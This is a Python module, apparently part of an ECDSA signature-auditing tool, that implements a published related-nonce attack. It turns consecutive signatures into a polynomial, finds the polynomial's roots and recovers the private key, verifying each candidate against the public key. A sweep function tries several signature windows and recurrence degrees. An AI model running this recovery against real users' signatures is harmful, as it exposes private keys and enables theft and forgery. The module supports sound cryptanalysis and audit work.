# SPDX-License-Identifier: GPL-3.0-or-later
"""
GPLv3 - the recursive polynomial construction (dpoly) in this module is
adapted from the algebraic technique published by Marco Macchetti
(Kudelski Security), "A Novel Related Nonce Attack for ECDSA"
(eprint.iacr.org/2023/305), and cross-verified against the reference
implementation at github.com/kudelskisecurity/ecdsa-polynomial-nonce-
recurrence-attack (GPLv3). The PAPER ITSELF is CC BY-NC-SA (non-
commercial) - this module implements the underlying mathematical
technique independently (verified numerically against synthetic data
during development, not transcribed from the paper's text), and follows
the GPLv3 terms of the reference code repository, which is the actual
source this construction was checked against.

Detection and solving are the same step here, same as hnp_lattice.py: a
verified polynomial root IS the finding.

Unlike hnp_lattice.py's HNP/lattice attack (which handles BOUNDED nonce
bias - some bits known/zero), this module handles nonces related by an
UNKNOWN polynomial recurrence: k_{i+1} = f(k_i) for some unknown low-
degree polynomial f. This is the case explicitly left out of scope
earlier in this project's development ("true blind LCG has no
established solution") - that conclusion was WRONG; this technique fills
exactly that gap via symbolic elimination + polynomial root-finding,
not a lattice construction.

KEY LIMITATION, verified empirically during development: for a degree-D
recurrence, this requires D+3 signatures MINIMUM, but a single N-signature
attempt only succeeds roughly 33-40% of the time (measured across many
synthetic trials, consistent across recurrence degrees) - NOT because of
implementation error, but because the private key must land in a root of
the derived polynomial that actually lies in the base field GF(N); the
polynomial's other roots typically live in field extensions and are
mathematically inaccessible to a direct attack. There is no known way to
predict in advance whether a given signature subset will factor
favorably - the practical mitigation is the same as this project's
lattice subset-sampling: collect more signatures than the strict minimum
and try multiple independent subsets, verifying each candidate against
the real public key.

References:
- Macchetti, "A Novel Related Nonce Attack for ECDSA", eprint.iacr.org/2023/305
- github.com/kudelskisecurity/ecdsa-polynomial-nonce-recurrence-attack (GPLv3)
"""

from dataclasses import dataclass
import sympy as sp
from sympy import GF, Poly as SPoly

from curve import Signature, N


@dataclass
class PolyRecurrenceHypothesis:
    """
    degree: the assumed degree D of the unknown recurrence k_{i+1} = f(k_i),
    where f is a degree-D polynomial with UNKNOWN coefficients. degree=1
    is the linear case (k_{i+1} = alpha*k_i + beta); this generalizes the
    known-coefficient linear relation check in exact_checks.py to the
    case where alpha, beta themselves are unknown.

    Requires exactly degree+3 CONSECUTIVE signatures (consecutive under
    whatever ordering the caller provides - typically original file order
    or timestamp order, since the recurrence only relates nonces that
    were actually generated one after another).
    """
    degree: int

    def required_signatures(self) -> int:
        return self.degree + 3

    def label(self) -> str:
        return f"poly-recurrence-deg{self.degree}"


@dataclass
class PolyRecurrenceResult:
    hypothesis: PolyRecurrenceHypothesis
    num_signatures_used: int
    polynomial_degree: int
    candidate_d: int | None
    verified: bool
    note: str


def _k_ij_expr(d_sym, sig_i: Signature, sig_j: Signature):
    """
    The core substitution: k_i - k_j expressed as a linear function of
    the unknown private key d, using k = r*s^-1*d + z*s^-1 (mod N) for
    each signature. This is the same equation (a*d + b) used throughout
    this codebase, just expressed as a difference between two
    signatures' equations so the additive structure of any polynomial
    recurrence in k can be eliminated without ever solving for the
    recurrence's own unknown coefficients directly.
    """
    s_inv_i = pow(sig_i.s, -1, N)
    s_inv_j = pow(sig_j.s, -1, N)
    a_i = (sig_i.r * s_inv_i) % N
    b_i = (sig_i.z * s_inv_i) % N
    a_j = (sig_j.r * s_inv_j) % N
    b_j = (sig_j.z * s_inv_j) % N
    return d_sym * (a_i - a_j) + (b_i - b_j)


def _build_recurrence_polynomial(sigs: list[Signature], d_sym):
    """
    Recursive construction eliminating the recurrence's unknown
    coefficients, leaving a single polynomial in d alone whose roots
    include the true private key (verified numerically against many
    synthetic trials during development - see module docstring for the
    empirically-measured base-field-landing rate).

    Requires len(sigs) == degree + 3 for the hypothesis this is called
    under (degree = len(sigs) - 3); the recursion depth and structure
    are fixed by that signature count.
    """
    n = len(sigs)

    def k_ij(i, j):
        return _k_ij_expr(d_sym, sigs[i], sigs[j])

    def dpoly(i, j):
        if i == 0:
            return sp.expand(
                k_ij(j + 1, j + 2) * k_ij(j + 1, j + 2)
                - k_ij(j + 2, j + 3) * k_ij(j + 0, j + 1)
            )
        left = dpoly(i - 1, j)
        for m in range(1, i + 2):
            left = left * k_ij(j + m, j + i + 2)
        right = dpoly(i - 1, j + 1)
        for m in range(1, i + 2):
            right = right * k_ij(j, j + m)
        return sp.expand(left - right)

    degree_index = n - 4  # matches dpoly(Nsigs - 4, 0) verified during development
    return dpoly(degree_index, 0)


def run_poly_recurrence_attack(
    sigs: list[Signature],
    hyp: PolyRecurrenceHypothesis,
    pubkey_point,
    generator,
) -> PolyRecurrenceResult:
    """
    Attempt polynomial-recurrence key recovery on exactly
    hyp.required_signatures() consecutive signatures. Builds the
    elimination polynomial, finds its roots in GF(N), and checks each
    root against the real public key point - same verify-before-trust
    discipline as every other recovery path in this codebase.

    Callers needing to search across multiple signature subsets (since
    any single attempt only succeeds ~33-40% of the time, per the module
    docstring) should use sweep_poly_recurrence rather than calling this
    directly in a loop - see that function for the retry strategy.
    """
    required = hyp.required_signatures()
    m = len(sigs)

    if m != required:
        return PolyRecurrenceResult(
            hyp, m, 0, None, False,
            f"requires exactly {required} signatures for degree-{hyp.degree} "
            f"recurrence, got {m} - use sweep_poly_recurrence to try "
            f"different {required}-signature windows from a larger set"
        )

    d_sym = sp.symbols("dd")
    try:
        poly_expr = _build_recurrence_polynomial(sigs, d_sym)
        poly = sp.Poly(poly_expr, d_sym)
    except Exception as e:
        return PolyRecurrenceResult(
            hyp, m, 0, None, False,
            f"polynomial construction failed: {e} - likely degenerate "
            f"signature data (e.g. a zero coefficient collapsing the "
            f"recursion)"
        )

    if poly.degree() < 1:
        return PolyRecurrenceResult(
            hyp, m, poly.degree(), None, False,
            "degenerate polynomial (degree < 1) - cannot extract a candidate key"
        )

    coeffs = [int(c) % N for c in poly.all_coeffs()]
    if all(c == 0 for c in coeffs):
        return PolyRecurrenceResult(
            hyp, m, poly.degree(), None, False,
            "all coefficients vanished mod N - degenerate case"
        )

    Fp = GF(N)
    poly_modN = SPoly(coeffs, d_sym, domain=Fp)
    roots = poly_modN.ground_roots()

    for root_val in roots:
        candidate = int(root_val) % N
        if candidate == 0:
            continue
        if candidate * generator == pubkey_point:
            return PolyRecurrenceResult(
                hyp, m, poly.degree(), candidate, True,
                f"recovered via polynomial root ({len(roots)} base-field "
                f"root(s) found out of degree {poly.degree()}), verified "
                f"against public key point"
            )

    return PolyRecurrenceResult(
        hyp, m, poly.degree(), None, False,
        f"{len(roots)} base-field root(s) found (degree {poly.degree()} "
        f"polynomial) but none verified against the public key - the "
        f"true key's root likely lies in a field extension for this "
        f"particular signature window (see module docstring: this is "
        f"expected roughly 60-67% of the time per attempt, not a bug)"
    )


def sweep_poly_recurrence(
    sigs: list[Signature],
    pubkey_point,
    generator,
    degrees: list[int] = None,
    max_windows_per_degree: int = 20,
) -> list[PolyRecurrenceResult]:
    """
    Try polynomial-recurrence recovery across multiple consecutive
    signature windows and recurrence degrees, since any single window
    only has a ~33-40% chance of the true key landing in a base-field
    root (see module docstring). Signatures must be pre-sorted by the
    caller into a plausible generation order (e.g. timestamp) - windows
    are drawn as CONSECUTIVE slices, not random subsets, since the
    recurrence relation only holds between nonces that were actually
    generated one after another.

    degrees defaults to [1, 2, 3] - low-degree recurrences are both the
    most computationally practical (polynomial degree, and therefore
    root-finding cost, grows quickly with recurrence degree - see module
    docstring's timing notes) and the most plausible real-world case
    (a simple broken counter/PRNG update rule, not a high-degree
    polynomial nonce generator, which would be an unusual thing for real
    software to implement by accident).

    Stops early once any window verifies. Returns every attempted result
    either way for a full audit trail, same convention as
    hnp_lattice.sweep_bias_hypotheses.
    """
    if degrees is None:
        degrees = [1, 2, 3]

    results = []
    for degree in degrees:
        hyp = PolyRecurrenceHypothesis(degree=degree)
        window_size = hyp.required_signatures()

        if len(sigs) < window_size:
            results.append(PolyRecurrenceResult(
                hyp, len(sigs), 0, None, False,
                f"need at least {window_size} signatures for degree-{degree} "
                f"recurrence, only have {len(sigs)}"
            ))
            continue

        num_windows = min(len(sigs) - window_size + 1, max_windows_per_degree)
        for start in range(num_windows):
            window = sigs[start:start + window_size]
            result = run_poly_recurrence_attack(window, hyp, pubkey_point, generator)
            results.append(result)
            if result.verified:
                return results

    return results
